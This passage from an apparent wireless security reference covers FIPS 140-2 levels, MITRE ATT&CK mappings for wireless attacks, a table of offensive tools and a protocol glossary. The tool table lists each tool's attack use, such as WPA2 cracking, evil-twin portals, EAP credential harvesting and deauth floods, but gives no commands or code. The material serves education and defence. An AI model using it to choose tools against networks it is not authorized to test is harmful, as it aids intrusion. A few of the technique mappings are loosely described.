- CMVP (Cryptographic Module Validation Program) — list of validated modules at csrc.nist.gov/projects/cryptographic-module-validation-program.

**FIPS 140-2 security levels:**

| Level | Description |
|---|---|
| 1 | Basic security requirements; software-only modules allowed |
| 2 | Tamper-evidence (coatings, seals) + role-based authentication |
| 3 | Tamper-detection and response; identity-based authentication; zeroize keys on tamper |
| 4 | Complete physical security envelope; protects against environmental attacks |

**Common FIPS-validated wireless components:**
- Cisco Catalyst wireless APs — AES modules FIPS validated.
- Aruba AP series — AES/CCMP modules validated.
- Microsoft Windows WPA2 supplicant — uses BCRYPT.DLL (FIPS validated).

---

### 10.5 MITRE ATT&CK Wireless Technique Mapping

MITRE ATT&CK for Enterprise includes wireless-relevant techniques:

| Technique ID | Name | Description |
|---|---|---|
| T1557.003 | DHCP Spoofing | Rogue DHCP server on wireless segment |
| T1040 | Network Sniffing | Passive capture on wireless interface |
| T1557 | Adversary-in-the-Middle | Evil twin / ARP spoofing over wireless |
| T1565.002 | Transmitted Data Manipulation | Modify packets in transit via MITM |
| T1110.001 | Brute Force: Password Guessing | WPA2 PSK offline cracking |
| T1110.003 | Password Spraying | Enterprise WPA2 credential spray |
| T1499 | Endpoint Denial of Service | Deauth flood, beacon flood |
| T1600.002 | Weaken Encryption | Force WEP/TKIP downgrade |
| T1205.002 | Traffic Signaling: Socket Filters | Monitor mode capture triggers |

**MITRE ATT&CK for Mobile (additional wireless relevance):**

| Technique ID | Name | Description |
|---|---|---|
| T1465 | Rogue Wi-Fi Access Points | Evil twin for mobile device interception |
| T1466 | Downgrade to Insecure Protocols | Force 2G, WEP, HTTP |
| T1467 | Rogue Cellular Base Station | IMSI catcher |
| T1468 | Remotely Wipe Data | Via compromised MDM or SIM swap |
| T1430 | Location Tracking | SS7 location query, IMSI catcher |
| T1429 | Capture Audio | Via compromised baseband / rogue AP MITM |

---

## Quick Reference: Common Attack Tools

| Tool | Category | Primary Use |
|---|---|---|
| Aircrack-ng suite | Wi-Fi | Monitor mode, capture, injection, cracking |
| Hashcat | Password cracking | GPU-accelerated WPA2/PMKID cracking |
| hcxdumptool | Wi-Fi | PMKID capture, handshake collection |
| hcxpcapngtool | Wi-Fi | Convert captures to hashcat format |
| Kismet | Wi-Fi/BT | Passive discovery and logging |
| Wireshark | All | Protocol analysis and capture |
| hostapd-wpe | Wi-Fi | Rogue enterprise AP, EAP credential harvesting |
| wifiphisher | Wi-Fi | Captive portal attacks, evil twin automation |
| Proxmark3 | RFID/NFC | LF/HF RFID read/write/emulate |
| KillerBee | Zigbee | IEEE 802.15.4 capture and analysis |
| Ubertooth One | Bluetooth | BLE/Classic Bluetooth sniffing |
| crackle | Bluetooth | LE Legacy pairing decryption |
| bettercap | Network/BLE | MITM framework, BLE enumeration |
| mdk4 | Wi-Fi | Beacon flood, deauth, auth DoS |
| HackRF One | SDR | Broadband TX/RX for custom RF protocols |
| YARD Stick One | Sub-GHz | Z-Wave, LoRa, ISM-band testing |
| rtl-sdr | SDR | Receive-only spectrum analysis |
| GNURadio | SDR | Flowgraph-based signal processing |
| SnoopSnitch | Cellular | IMSI catcher detection on Android |
| asleap | Wi-Fi | LEAP/MSCHAPv2 cracking |
| reaver | Wi-Fi | WPS PIN brute force |
| wash | Wi-Fi | WPS AP discovery |

---

## Glossary

| Term | Definition |
|---|---|
| BSSID | Basic Service Set Identifier — 6-byte MAC address of an AP |
| SSID | Service Set Identifier — human-readable network name |
| ESSID | Extended SSID — same as SSID in modern usage |
| PMK | Pairwise Master Key — 256-bit key derived from passphrase or 802.1X |
| PTK | Pairwise Transient Key — session key derived from PMK for unicast data |
| GTK | Group Temporal Key — shared key for multicast/broadcast data |
| MIC | Message Integrity Code — authentication tag on frames |
| ANonce | Authenticator Nonce — random value from AP in 4-way handshake |
| SNonce | Supplicant Nonce — random value from client in 4-way handshake |
| PMKID | PMK Identifier — hash linking PMK to AP and client MACs |
| SAE | Simultaneous Authentication of Equals — WPA3 PSK replacement |
| EAP | Extensible Authentication Protocol — framework for authentication methods |
| RADIUS | Remote Authentication Dial-In User Service — AAA protocol for 802.1X |
| EAPOL | EAP over LAN — encapsulates EAP in 802.3/802.11 frames |
| PEAP | Protected EAP — EAP in TLS tunnel; server cert only |
| EAP-TLS | EAP with TLS — mutual certificate authentication |
| TKIP | Temporal Key Integrity Protocol — WPA's RC4-based encryption |
| CCMP | Counter Mode with CBC-MAC Protocol — WPA2's AES-based encryption |
| MFP | Management Frame Protection — 802.11w feature |
| WPS | Wi-Fi Protected Setup — PIN or PBC device onboarding |
| KARMA | Attack exploiting automatic probe request responses |
| IMSI | International Mobile Subscriber Identity — unique SIM identifier |
| SUCI | Subscription Concealed Identifier — 5G privacy-preserving IMSI substitute |
| HSS | Home Subscriber Server — LTE subscriber database |
| MME | Mobility Management Entity — LTE core authentication node |
| USIM | Universal SIM — UMTS/LTE SIM with AKA algorithms |
| EPC | Electronic Product Code — UHF RFID identifier standard |
| GATT | Generic Attribute Profile — BLE data exchange framework |
| UUID | Universally Unique Identifier — 128-bit GATT service/characteristic ID |
| LTK | Long-Term Key — BLE key stored after initial pairing |
| STK | Short-Term Key — temporary BLE session key during pairing |
| OOB | Out-of-Band — secondary channel for key exchange (NFC, manual) |
| SSP | Secure Simple Pairing — Bluetooth 2.1+ pairing with ECDH |
| ECDH | Elliptic Curve Diffie-Hellman — key agreement primitive |
| NetKey | Zigbee Network Key — shared encryption key for all network nodes |
| AppKey | Zigbee / LoRaWAN Application Key — end-to-end payload encryption |
| OTAA | Over-The-Air Activation — LoRaWAN dynamic key provisioning |
| ABP | Activation By Personalization — LoRaWAN static key provisioning |
| DSK | Device Specific Key — Z-Wave S2 OOB verification passphrase |
| DAC | Device Attestation Certificate — Matter device authenticity proof |
| NOC | Node Operational Certificate — Matter per-session identity |
| PASE | Passcode-Authenticated Session Establishment — Matter commissioning |
| CASE | Certificate-Authenticated Session Establishment — Matter post-commissioning |

---

*Last updated: 2026-04-26 | TeamStarWolf Cybersecurity Reference Library*
*Classification: Public Reference | For authorized use in ethical security research and education*
